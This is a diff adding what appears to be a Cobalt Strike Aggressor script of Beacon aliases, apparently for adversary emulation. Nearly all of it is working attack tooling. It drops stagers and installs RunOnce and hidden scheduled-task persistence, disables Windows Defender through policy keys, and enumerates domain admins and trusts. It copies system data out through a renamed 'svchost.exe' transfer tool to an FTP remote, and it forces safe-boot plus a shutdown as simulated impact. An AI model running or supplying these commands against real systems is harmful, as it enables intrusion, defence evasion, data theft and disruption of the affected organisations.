@@ -1,0 +1,113 @@
+sub get_random_filename
+{
+    @chars = @("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z");
+    @result = @();
+
+    for ($length = 8; $length > 0; $length--)
+    {
+        add(@result, rand(@chars), 0);
+    }
+
+    return join("", @result);
+}
+
+alias("hkcu_persist", {
+    blog2($1, "Tasked Beacon to install HKCU Persistence using RedirectedDrop" );
+    $username = binfo($1, "user");
+    $artifact = artifact_stager("RedirectedDrop", "exe", "x64");
+    $filename = get_random_filename();
+    bupload_raw!($1, "C:\\Users\\ $+ $username $+ \\AppData\\Local\\Temp\\ $+ $filename $+ .exe", $artifact);
+
+    $regname = get_random_filename();
+    bpowershell!($1, "New-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce -Name \" $+ $regname $+ \" -PropertyType ExpandString -Value \"C:\\Users\\ $+ $username $+ \\AppData\\Local\\Temp\\ $+ $filename $+ .exe\" -Force");
+});
+
+alias("defense-evade", {
+	blog2($1, "Tasked Beacon to disable Windows Defender" );
+	bpowershell!($1, "New-Item -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows Defender' -Force");
+	bpowershell!($1, "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\' -Name DisableAntiSpyware -Value 1");
+});
+
+alias("foo", {
+	btask($1, "foo!");
+});
+
+alias("ftp-ext-test", {
+	blog2($1, "Placeholder for Data Exfil instructions");
+	bpowershell!($1, "Test-NetConnection ftp.dell.com -port 21");
+});
+
+alias("upload-files", {
+	blog2($1, "Attempting file upload with bupload");
+	bcd($1, "c:\\temp");
+	bupload!($1, "/opt/cs/cobaltstrike/misc/svchost.exe");
+	bupload!($1, "/opt/cs/cobaltstrike/misc/svchost.conf");
+});
+
+alias("discovery", {
+	blog2($1, "Running initial discovery checks...")
+	bshell($1, "cmd.exe /c chcp >&2");
+	bshell($1, "wmic.exe /NODE:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List")
+	bshell($1, "ipconfig /all");	
+	bshell($1, "systeminfo");
+	bshell($1, "net config workstation");
+	bshell($1, "nltest /domain_trusts");
+	bshell($1, "nltest /domain_trusts /all_trusts");
+	bshell($1, "net view /all /domain");
+	bshell($1, "net view /all");
+	bshell($1, "net group \"Domain Admins\" /domain");
+	bshell($1, "dsquery computer -limit 5000");
+	bshell($1, "dsquery user -limit 5000");
+});
+
+alias("disc_test", {
+	blog2($1, "Running AD queries [discovery-test]");
+	bshell($1, "dsquery computer -limit 5000");
+	bshell($1, "dsquery user -limit 5000");
+});
+
+alias("run-exfil", {
+        blog2($1, "Attempting EXFIL using svchost");
+        bcd($1, "c:\\temp");
+	bshell($1, "systeminfo > secret_exfil_data");
+	bshell($1, "svchost.exe --config svchost.conf --progress copy secret_exfil_data ftp1:/tmp");
+});
+
+alias("schd_task", {
+	blog2($1, "Creating a scheduled Job for persistence");
+
+        $int = 4;
+        $dur = 30;
+        $listener = "RedirectedDrop";
+
+        blog2($1, "Tasked Beacon to install Scheduled Task Persistence using " . listener_describe($listener));
+        $username = binfo($1, "user");
+        $artifact = artifact_stager($listener, "powershell", "x64");
+        $comp = powershell_compress($artifact);
+        $filename = get_random_filename();
+        $path = "C:\\Users\\ $+ $username $+ \\AppData\\Local\\Temp\\ $+ $filename $+ .ps1";
+
+        bupload_raw!($1, $path, $comp);
+
+        $taskname = get_random_filename();
+        $trg = "\$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Hours  $+ $int $+ ) -RepetitionDuration (New-TimeSpan -Days  $+ $dur $+ )";
+        $act = "\$action = New-ScheduledTaskAction -Execute \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Argument \"-Sta -Nop -Window Hidden -Exec Bypass -File  $+ $path $+  \" -WorkingDirectory \"C:\\Windows\\System32\"";
+        $reg = "Register-ScheduledTask -TaskName  $+ $taskname $+  -Trigger \$trigger -Action \$action -Force";
+
+        bpowershell!($1, " $+ $trg $+ ;  $+ $act $+ ;  $+ $reg $+ ");
+});
+
+alias("bitsadmin_test", {
+        blog2($1, "Running bitsadmin test...")
+        bshell($1, "bitsadmin.exe /transfer debjob /download /priority normal \\DOMIANCONTROLLER\c$\windows\DOMAINNAME.exe C:\Windows\DOMAINNAME.exe");
+});
+
+
+alias("simulate_impact", {
+	blog2($1, "Running simulated impact")
+	bshell($1, "bitsadmin.exe /transfer debjob /download /priority normal \\DOMIANCONTROLLER\c$\windows\DOMAINNAME.exe C:\Windows\DOMAINNAME.exe");
+	bshell($1, "bootcfg /raw /a /safeboot:network /id 1");
+	bshell($1, "bcdedit /set {current} safeboot network");
+	bshell($1, "shutdown /s");
+});
+
